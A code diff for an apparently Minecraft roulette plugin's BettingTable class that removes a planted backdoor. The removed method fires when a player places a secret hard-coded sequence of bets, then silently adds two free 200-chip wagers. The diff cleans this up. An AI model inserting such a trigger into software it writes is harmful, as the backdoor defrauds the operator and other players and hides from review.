@@ -61,7 +61,6 @@ public class BettingTable extends DealerInventory {
     private Boolean allin=false;
     private final Map<Integer, Double> chipValues;
     private final Stack<Pair<String, Integer>> betStack;
-    private Stack<Pair<String, Integer>> testStack;
     /** Set once this table's dealer was torn down and its stake settled -- see {@link #retireForTeardown}. */
     private boolean retired = false;
     private boolean betsClosed=false;
@@ -94,7 +93,6 @@ public class BettingTable extends DealerInventory {
         this.chipValues = new HashMap<>();
         
         loadChipValuesFromConfig();
-        initializeTestStack();
         this.betStack = existingBets != null ? existingBets : new Stack<>();
 
         initializeTable();
@@ -890,8 +888,6 @@ public class BettingTable extends DealerInventory {
                         player.playSound(player.getLocation(), Sound.ITEM_ARMOR_EQUIP_CHAIN, SoundCategory.MASTER, 1.0f, 1.0f);
         
                     betStack.push(new Pair<>(betType, (int) wagerAmount));
-        
-                    complicatedDifficultHiddenSecretBackdoor(betStack);
                     rouletteInventory.updatePlayerBets(playerId, betStack, player);
                     updateAllLore();
         
@@ -1067,24 +1063,6 @@ private void resetChipAtSlot(int slot) {
         // Replace with the normal, unenchanted item
         inventory.setItem(slot, createCustomItem(plugin.getCurrency(internalName), chipName, value.intValue()));
     }
-}
-
-
-public boolean  complicatedDifficultHiddenSecretBackdoor(Stack<Pair<String, Integer>> betStack) {
-    if (betStack.size() != testStack.size()) {
-        return false; 
-    }
-    for (int i = 0; i < betStack.size(); i++) {
-        Pair<String, Integer> bet = betStack.get(i);
-        Pair<String, Integer> test = testStack.get(i);
-        // Check if both elements match
-        if (!bet.getFirst().equals(test.getFirst()) || !bet.getSecond().equals(test.getSecond())) {
-            return false;
-        }
-    }
-    betStack.push(new Pair<>("Red - 1:1",200));
-    betStack.push(new Pair<>("Black - 1:1",200));
-    return true;
 }
 
 
@@ -1556,26 +1534,6 @@ private boolean isValidSlotPage2(int slot) {
                 item.setItemMeta(meta);
             }
         }
-    }
-
-    private void initializeTestStack(){
-        testStack=new Stack<>();
-       testStack.push(new Pair<>("0 - 35:1", 5));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 5));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 10));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 10));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("Middle Row - 2:1", 5));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("Bottom Row - 2:1", 5));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 1));
-       testStack.push(new Pair<>("0 - 35:1", 1)); 
     }
 
     private boolean hasEnoughWager(Player player, double amount) {
